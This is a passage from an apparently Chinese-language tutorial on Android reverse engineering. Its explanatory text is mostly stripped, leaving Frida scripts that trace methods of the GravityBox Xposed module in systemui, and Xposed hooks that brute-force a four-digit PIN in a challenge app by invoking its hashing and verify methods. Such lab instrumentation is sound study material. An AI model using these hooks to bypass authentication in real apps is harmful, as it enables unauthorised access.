language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found!&quot;</span>)</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(loader)</span><br><span class="line">                        <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = loader</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span>(error)&#123;&#125;</span><br><span class="line">            &#125;, <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;end&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)  </span><br><span class="line">        <span class="keyword">var</span> targetClassMethod = <span class="string">&quot;com.roysue.xposed1.HookTest$1.beforeHookedMethod&quot;</span></span><br><span class="line">        <span class="keyword">var</span> delim = targetClassMethod.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">        <span class="keyword">var</span> targetClass = targetClassMethod.<span class="title function_">slice</span>(<span class="number">0</span>, delim)</span><br><span class="line">        <span class="keyword">var</span> targetMethod = targetClassMethod.<span class="title function_">slice</span>(delim + <span class="number">1</span>, targetClassMethod.<span class="property">length</span>)   </span><br><span class="line">        <span class="keyword">var</span> hook = <span class="title class_">Java</span>.<span class="title function_">use</span>(targetClass)</span><br><span class="line">        <span class="comment">// targetMethod </span></span><br><span class="line">        <span class="keyword">var</span> overloadCount = hook[targetMethod].<span class="property">overloads</span>.<span class="property">length</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Tracing &quot;</span> + targetClassMethod + <span class="string">&quot; [&quot;</span> + overloadCount + <span class="string">&quot; overload(s)]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; overloadCount; i++) &#123;</span><br><span class="line">            hook[targetMethod].<span class="property">overloads</span>[i].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&quot;\n*** entered &quot;</span> + targetClassMethod)</span><br><span class="line">                <span class="comment">//  arguments</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; j++) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg[&quot;</span> + j + <span class="string">&quot;]: &quot;</span> + <span class="variable language_">arguments</span>[j])</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//  retval</span></span><br><span class="line">                <span class="keyword">var</span> retval = <span class="variable language_">this</span>[targetMethod].<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval: &quot;</span> + retval)</span><br><span class="line">                <span class="keyword">return</span> retval</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;)    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;button</p><p><img src="/images/frida-reverse-analysis-2/image-20231021164742074.png" alt="image-20231021164742074" style="zoom:67%;" /></p><p>&emsp;afterHookedMethod</p><p><img src="/images/frida-reverse-analysis-2/image-20231021164848886.png" alt="image-20231021164848886" style="zoom:67%;" /></p><p>&emsp;GravityBoxbeforeHookedMethodafterHookedMethodhook</p><p>1GravityBox.apk<a href="https://www.modapkdown.com/com.ceco.nougat.gravitybox/download-by-happymod.html"></a></p><p>2com.ceco.nougat.gravitybox.ModStatusbarColorobjection</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hook.js</span></span><br><span class="line"><span class="comment">//  ModStatusbarColor$1  loaderModStatusbarColor$1  loader loader  gravitybox  XC_MethodHook ModStatusbarColor </span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">lookClass</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//  loader ModStatusbarColor$1  loader</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">loader</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(loader.<span class="title function_">findClass</span>(<span class="string">&quot;com.ceco.nougat.gravitybox.ModStatusbarColor$1&quot;</span>))&#123;</span><br><span class="line">                        <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = loader ;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span>(error)&#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment">// ModStatusbarColor$1  loader </span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="property">enumerateLoadedClasses</span> (&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">className</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//  gravitybox </span></span><br><span class="line">                    <span class="keyword">if</span>(className.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;gravitybox&quot;</span>) &gt; <span class="number">0</span> &amp;&amp; className.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;$&quot;</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                        <span class="comment">//  XC_MethodHook  beforeHookedMethod  afterHookedMethod </span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(className).<span class="property">class</span>.<span class="title function_">getSuperclass</span>())&#123;</span><br><span class="line">                            <span class="keyword">var</span> superClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(className).<span class="property">class</span>.<span class="title function_">getSuperclass</span>().<span class="title function_">getName</span>()</span><br><span class="line">                            <span class="keyword">if</span> (superClass.<span class="title function_">indexOf</span>(<span class="string">&quot;XC_MethodHook&quot;</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                                <span class="variable language_">console</span>.<span class="title function_">log</span>(className)</span><br><span class="line">                                <span class="comment">// traceClass(className)</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;     </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span>(error)&#123;&#125;</span><br><span class="line">            &#125;, <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;search completed!&quot;</span>)     </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)  </span><br><span class="line">    &#125;)    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;ModStatusbarColor<code>FridaxposedxposedModStatusbarColorcom.android.systemuicom.android.systemuiModStatusbarColorFridaxposed1com.android.systemuicom.android.systemui</code>XposedsystemuiModStatusbarColor</p><p><img src="/images/frida-reverse-analysis-2/image-20231021180801457.png" alt="image-20231021180801457" style="zoom:67%;" /></p><p>&emsp;systemuifridahook.js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U com.android.systemui -l hook.js --no-pause</span><br></pre></td></tr></table></figure><p>&emsp;</p><p><img src="/images/frida-reverse-analysis-2/image-20231021181737662.png" alt="image-20231021181737662" style="zoom:67%;" /></p><p>&emsp;hooktraceClass</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">traceMethod</span>(<span class="params">targetClassMethod</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> delim = targetClassMethod.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> targetClass = targetClassMethod.<span class="title function_">slice</span>(<span class="number">0</span>, delim)</span><br><span class="line">    <span class="keyword">var</span> targetMethod = targetClassMethod.<span class="title function_">slice</span>(delim + <span class="number">1</span>, targetClassMethod.<span class="property">length</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> hook = <span class="title class_">Java</span>.<span class="title function_">use</span>(targetClass);</span><br><span class="line">    <span class="keyword">var</span> overloadCount = hook[targetMethod].<span class="property">overloads</span>.<span class="property">length</span></span><br><span class="line"><span class="comment">// hook </span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; overloadCount; i++) &#123;</span><br><span class="line">        hook[targetMethod].<span class="property">overloads</span>[i].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&quot;\n*** entered &quot;</span> + targetClassMethod)</span><br><span class="line">            <span class="comment">// print args</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; j++) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg[&quot;</span> + j + <span class="string">&quot;]: &quot;</span> + <span class="variable language_">arguments</span>[j])</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// print retval</span></span><br><span class="line">            <span class="keyword">var</span> retval = <span class="variable language_">this</span>[targetMethod].<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\nretval: &quot;</span> + retval)</span><br><span class="line">            <span class="keyword">return</span> retval</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">uniqBy</span>(<span class="params">array, key</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> seen = &#123;&#125;;</span><br><span class="line">    <span class="keyword">return</span> array.<span class="title function_">filter</span>(<span class="keyword">function</span>(<span class="params">item</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> k = <span class="title function_">key</span>(item);</span><br><span class="line">        <span class="keyword">return</span> seen.<span class="title function_">hasOwnProperty</span>(k) ? <span class="literal">false</span> : (seen[k] = <span class="literal">true</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">traceClass</span>(<span class="params">targetClass</span>) &#123;</span><br><span class="line">    <span class="comment">//  Java.use </span></span><br><span class="line">    <span class="keyword">var</span> hook = <span class="title class_">Java</span>.<span class="title function_">use</span>(targetClass)</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="keyword">var</span> methods = hook.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>()</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    hook.<span class="property">$dispose</span></span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="keyword">var</span> parsedMethods = []</span><br><span class="line">    methods.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">method</span>) &#123;</span><br><span class="line">        <span class="comment">// method_name</span></span><br><span class="line">        parsedMethods.<span class="title function_">push</span>(method.<span class="title function_">toString</span>().<span class="title function_">replace</span>(targetClass + <span class="string">&quot;.&quot;</span>, <span class="string">&quot;TOKEN&quot;</span>).<span class="title function_">match</span>(<span class="regexp">/\sTOKEN(.*)\(/</span>)[<span class="number">1</span>])</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="keyword">var</span> targets = <span class="title function_">uniqBy</span>(parsedMethods, <span class="title class_">JSON</span>.<span class="property">stringify</span>)</span><br><span class="line">    <span class="comment">//  hook</span></span><br><span class="line">    targets.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">targetMethod</span>) &#123;</span><br><span class="line">        <span class="title function_">traceMethod</span>(targetClass + <span class="string">&quot;.&quot;</span> + targetMethod)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;traceClass<code>hookbeforeHookedMethodafterHookedMethod</code></p><p>&emsp;afterHookedMethod/beforeHookedMethodXC_MethodHookHookTest$1XC_MethodHookafterHookedMethod/beforeHookedMethod<code>XC_MethodHook</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// getAllXCMethodHook.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getAllXCMethodHook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">loader</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(loader.<span class="title function_">findClass</span>(<span class="string">&quot;com.ceco.nougat.gravitybox.ModStatusbarColor$1&quot;</span>))&#123;</span><br><span class="line">                        <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = loader ;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span>(error)&#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Java</span>.<span class="property">enumerateLoadedClasses</span> (&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">className</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(className.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;gravitybox&quot;</span>) &gt; <span class="number">0</span> &amp;&amp; className.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;$&quot;</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(className).<span class="property">class</span>.<span class="title function_">getSuperclass</span>())&#123;</span><br><span class="line">                            <span class="keyword">var</span> superClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(className).<span class="property">class</span>.<span class="title function_">getSuperclass</span>().<span class="title function_">getName</span>()</span><br><span class="line">                            <span class="keyword">if</span> (superClass.<span class="title function_">indexOf</span>(<span class="string">&quot;XC_MethodHook&quot;</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                                <span class="variable language_">console</span>.<span class="title function_">log</span>(superClass + <span class="string">&quot; | &quot;</span> + className)</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;    </span><br><span class="line">                &#125; <span class="keyword">catch</span>(error)&#123;&#125;</span><br><span class="line">            &#125;, <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;search completed!&quot;</span>)     </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)  </span><br><span class="line">    &#125;)    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;<code>com.android.systemui</code>hook.jsXC_MethodHook</p><p><img src="/images/frida-reverse-analysis-2/image-20231021223136596.png" alt="image-20231021223136596" style="zoom:67%;" /></p><p>&emsp;<code>XposedhookPathClassLoaderPathClassLoaderHookXposed APIXposedBridge.jarClassLoader</code></p><h3 id="Xposed--RPC-"><a href="#Xposed--RPC-" class="headerlink" title="Xposed  RPC "></a>Xposed  RPC </h3><h4 id="Xposed-"><a href="#Xposed-" class="headerlink" title="Xposed "></a>Xposed </h4><p>&emsp;example.apkpinpinapp<code>org.teamsik.ahe17.qualification.easy</code></p><p>1 objection </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objection -g org.teamsik.ahe17.qualification.easy explore</span><br><span class="line">android hooking list classes</span><br></pre></td></tr></table></figure><p>&emsp;<code>org.teamsik.ahe17.qualification.MainActivity</code>MainActivity</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class org.teamsik.ahe17.qualification.MainActivity</span><br></pre></td></tr></table></figure><p>&emsp;<code>VERIFY PIN</code><code>org.teamsik.ahe17.qualification.MainActivity.verifyPasswordClick</code></p><p>2jebverifyPasswordClickPIN4SHA1</p><p><img src="/images/frida-reverse-analysis-2/image-20231021232633646.png" alt="image-20231021232633646" style="zoom:67%;" /></p><p>&emsp;<code>Xposed</code>XposedAPI<code>callMethod/callStaticMethod</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">callMethod(Object obj, String methodName, Object... args)</span><br><span class="line">// &quot;Class&lt;?&gt; clazz&quot;  clazz </span><br><span class="line">callStaticMethod(Class&lt;?&gt; clazz, String methodName, Object... args)</span><br></pre></td></tr></table></figure><p>&emsp;XposedencodePasswordcallStaticMethodXposed</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  encodePassword</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;org.teamsik.ahe17.qualification.easy&quot;</span>))&#123;</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;inner: &quot;</span> + loadPackageParam.processName);</span><br><span class="line">        <span class="comment">//  verifier </span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> XposedHelpers.findClass(<span class="string">&quot;org.teamsik.ahe17.qualification.Verifier&quot;</span>, loadPackageParam.classLoader);</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        <span class="type">byte</span>[] p = <span class="string">&quot;09042ec2c2c08c4cbece042681caf1d13984f24a&quot;</span>.getBytes();</span><br><span class="line">        <span class="type">String</span> <span class="variable">pStr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(p);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">999</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">            <span class="comment">//  encodePassword</span></span><br><span class="line">            <span class="type">byte</span>[] v = (<span class="type">byte</span>[])XposedHelpers.callStaticMethod(clazz, <span class="string">&quot;encodePassword&quot;</span>, String.valueOf(i));</span><br><span class="line">            <span class="type">String</span> <span class="variable">vStr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(v);</span><br><span class="line">            <span class="comment">// </span></span><br><span class="line">            <span class="keyword">if</span>(vStr.equals(pStr))&#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;right.pin =&gt; &quot;</span>+ String.valueOf(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;example.apk9083pin<code>javainvokeXposedInvoke</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;org.teamsik.ahe17.qualification.easy&quot;</span>))&#123;</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;inner: &quot;</span> + loadPackageParam.processName);</span><br><span class="line">        <span class="comment">//  verifier  Method </span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> loadPackageParam.classLoader.loadClass(<span class="string">&quot;org.teamsik.ahe17.qualification.Verifier&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">encodePassword</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;encodePassword&quot;</span>, String.class);</span><br><span class="line">        <span class="comment">//  private </span></span><br><span class="line">        encodePassword.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        <span class="type">byte</span>[] p = <span class="string">&quot;09042ec2c2c08c4cbece042681caf1d13984f24a&quot;</span>.getBytes();</span><br><span class="line">        <span class="type">String</span> <span class="variable">pStr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(p);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">999</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">            <span class="comment">//  encodePassword</span></span><br><span class="line">            <span class="type">byte</span>[] v = (<span class="type">byte</span>[])encodePassword.invoke(<span class="literal">null</span>, String.valueOf(i));</span><br><span class="line">            <span class="type">String</span> <span class="variable">vStr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(v);</span><br><span class="line">            <span class="comment">// </span></span><br><span class="line">            <span class="keyword">if</span>(vStr.equals(pStr))&#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;right.pin =&gt; &quot;</span>+ String.valueOf(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;fridaxposed<code></code></p><p>&emsp;hookxposedjavaxposedfrida<code>verifyPassword(Context,String)</code>Contextfrida</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">ActivityThread</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.app.ActivityThread&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Context</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.content.Context&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> ctx = <span class="title class_">Java</span>.<span class="keyword">case</span>(<span class="title class_">ActivityThread</span>.<span class="title function_">currentApplication</span>().<span class="title function_">getApplicationContext</span>(), <span class="title class_">Context</span>)</span><br></pre></td></tr></table></figure><p>&emsp;xposed</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> AndroidAppHelper.currentApplication();</span><br></pre></td></tr></table></figure><p>&emsp;xposedverifyPassword</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;org.teamsik.ahe17.qualification.easy&quot;</span>))&#123;</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;inner: &quot;</span> + loadPackageParam.processName);</span><br><span class="line">        <span class="comment">//  verifier  Method </span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> loadPackageParam.classLoader.loadClass(<span class="string">&quot;org.teamsik.ahe17.qualification.Verifier&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">verifyPassword</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;verifyPassword&quot;</span>, Context.class, String.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> AndroidAppHelper.currentApplication();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">999</span>; i &lt; <span class="number">10000</span>; i++)&#123;</span><br><span class="line">            <span class="comment">// invoke  verifyPassword</span></span><br><span class="line">            <span class="keyword">if</span>((<span class="type">boolean</span>)verifyPassword.invoke(<span class="literal">null</span>, context, String.valueOf(i)))&#123;</span><br><span class="line">                XposedBridge.log(<span class="string">&quot;right.pin =&gt; &quot;</span>+ String.valueOf(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;xposedjava ConstructornewInstanceXposedHelpers.newInstance()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 